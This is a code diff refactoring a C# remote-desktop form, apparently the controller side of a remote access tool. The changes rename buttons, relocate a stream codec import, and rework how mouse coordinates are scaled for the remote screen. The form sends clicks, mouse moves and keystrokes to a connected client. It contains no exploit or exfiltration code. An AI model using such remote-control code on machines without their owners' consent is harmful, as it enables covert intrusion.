@@ -1,6 +1,4 @@
-﻿using StreamLibrary;
-using StreamLibrary.UnsafeCodecs;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -16,6 +14,7 @@ using System.Threading;
 using System.Drawing.Imaging;
 using System.IO;
 using Encoder = System.Drawing.Imaging.Encoder;
+using Server.StreamLibrary;
 
 namespace Server.Forms
 {
@@ -28,8 +27,7 @@ namespace Server.Forms
 
         public int FPS = 0;
         public Stopwatch sw = Stopwatch.StartNew();
-        public IUnsafeCodec decoder = new UnsafeStreamCodec(60);
-        public Size rdSize;
+        public UnsafeStreamCodec decoder = new UnsafeStreamCodec(60);
         private bool isMouse = false;
         private bool isKeyboard = false;
         public object syncPicbox = new object();
@@ -51,19 +49,19 @@ namespace Server.Forms
             catch { this.Close(); }
         }
 
-        private void Button2_Click(object sender, EventArgs e)
+        private void btnSlide_Click(object sender, EventArgs e)
         {
             if (panel1.Visible == false)
             {
                 panel1.Visible = true;
-                button2.Top = panel1.Bottom + 5;
-                button2.BackgroundImage = Properties.Resources.arrow_up;
+                btnSlide.Top = panel1.Bottom + 5;
+                btnSlide.BackgroundImage = Properties.Resources.arrow_up;
             }
             else
             {
                 panel1.Visible = false;
-                button2.Top = pictureBox1.Top + 5;
-                button2.BackgroundImage = Properties.Resources.arrow_down;
+                btnSlide.Top = pictureBox1.Top + 5;
+                btnSlide.BackgroundImage = Properties.Resources.arrow_down;
             }
         }
 
@@ -71,17 +69,17 @@ namespace Server.Forms
         {
             try
             {
-                button2.Top = panel1.Bottom + 5;
-                button2.Left = pictureBox1.Width / 2;
-                button1.Tag = (object)"stop";
-                button2.PerformClick();
+                btnSlide.Top = panel1.Bottom + 5;
+                btnSlide.Left = pictureBox1.Width / 2;
+                btnStart.Tag = (object)"stop";
+                btnSlide.PerformClick();
             }
             catch { }
         }
 
-        private void Button1_Click(object sender, EventArgs e)
+        private void btnStart_Click(object sender, EventArgs e)
         {
-            if (button1.Tag == (object)"play")
+            if (btnStart.Tag == (object)"play")
             {
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
@@ -94,12 +92,12 @@ namespace Server.Forms
                 numericUpDown2.Enabled = false;
                 btnSave.Enabled = true;
                 btnMouse.Enabled = true;
-                button1.Tag = (object)"stop";
-                button1.BackgroundImage = Properties.Resources.stop__1_;
+                btnStart.Tag = (object)"stop";
+                btnStart.BackgroundImage = Properties.Resources.stop__1_;
             }
             else
             {
-                button1.Tag = (object)"play";
+                btnStart.Tag = (object)"play";
                 try
                 {
                     MsgPack msgpack = new MsgPack();
@@ -112,18 +110,18 @@ namespace Server.Forms
                 numericUpDown2.Enabled = true;
                 btnSave.Enabled = false;
                 btnMouse.Enabled = false;
-                button1.BackgroundImage = Properties.Resources.play_button;
+                btnStart.BackgroundImage = Properties.Resources.play_button;
             }
         }
 
         private void FormRemoteDesktop_ResizeEnd(object sender, EventArgs e)
         {
-            button2.Left = pictureBox1.Width / 2;
+            btnSlide.Left = pictureBox1.Width / 2;
         }
 
         private void BtnSave_Click(object sender, EventArgs e)
         {
-            if (button1.Tag == (object)"stop")
+            if (btnStart.Tag == (object)"stop")
             {
                 if (timerSave.Enabled)
                 {
@@ -180,9 +178,8 @@ namespace Server.Forms
         {
             try
             {
-                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
+                if (btnStart.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
                 {
-                    Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                     int button = 0;
                     if (e.Button == MouseButtons.Left)
                         button = 2;
@@ -192,8 +189,8 @@ namespace Server.Forms
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                     msgpack.ForcePathObject("Option").AsString = "mouseClick";
-                    msgpack.ForcePathObject("X").AsInteger = p.X;
-                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
+                    msgpack.ForcePathObject("X").AsInteger = e.X * decoder.Resolution.Width / pictureBox1.Width;
+                    msgpack.ForcePathObject("Y").AsInteger = e.Y * decoder.Resolution.Height / pictureBox1.Height;
                     msgpack.ForcePathObject("Button").AsInteger = button;
                     ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
@@ -205,9 +202,8 @@ namespace Server.Forms
         {
             try
             {
-                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
+                if (btnStart.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
                 {
-                    Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                     int button = 0;
                     if (e.Button == MouseButtons.Left)
                         button = 4;
@@ -217,8 +213,8 @@ namespace Server.Forms
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                     msgpack.ForcePathObject("Option").AsString = "mouseClick";
-                    msgpack.ForcePathObject("X").AsInteger = p.X;
-                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
+                    msgpack.ForcePathObject("X").AsInteger = e.X * decoder.Resolution.Width / pictureBox1.Width;
+                    msgpack.ForcePathObject("Y").AsInteger = e.Y * decoder.Resolution.Height / pictureBox1.Height;
                     msgpack.ForcePathObject("Button").AsInteger = button;
                     ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
@@ -232,12 +228,11 @@ namespace Server.Forms
             {
                 if (pictureBox1.Image != null && this.ContainsFocus && isMouse)
                 {
-                    Point p = new Point(e.X * (rdSize.Width / pictureBox1.Width), e.Y * (rdSize.Height / pictureBox1.Height));
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                     msgpack.ForcePathObject("Option").AsString = "mouseMove";
-                    msgpack.ForcePathObject("X").AsInteger = p.X;
-                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
+                    msgpack.ForcePathObject("X").AsInteger = e.X * decoder.Resolution.Width / pictureBox1.Width;
+                    msgpack.ForcePathObject("Y").AsInteger = e.Y * decoder.Resolution.Height / pictureBox1.Height;
                     ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
             }
@@ -289,7 +284,7 @@ namespace Server.Forms
 
         private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
         {
-            if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isKeyboard)
+            if (btnStart.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isKeyboard)
             {
                 if (!IsLockKey(e.KeyCode))
                     e.Handled = true;
@@ -310,7 +305,7 @@ namespace Server.Forms
 
         private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
         {
-            if (button1.Tag == (object)"stop" && pictureBox1.Image != null && this.ContainsFocus && isKeyboard)
+            if (btnStart.Tag == (object)"stop" && pictureBox1.Image != null && this.ContainsFocus && isKeyboard)
             {
                 if (!IsLockKey(e.KeyCode))
                     e.Handled = true;
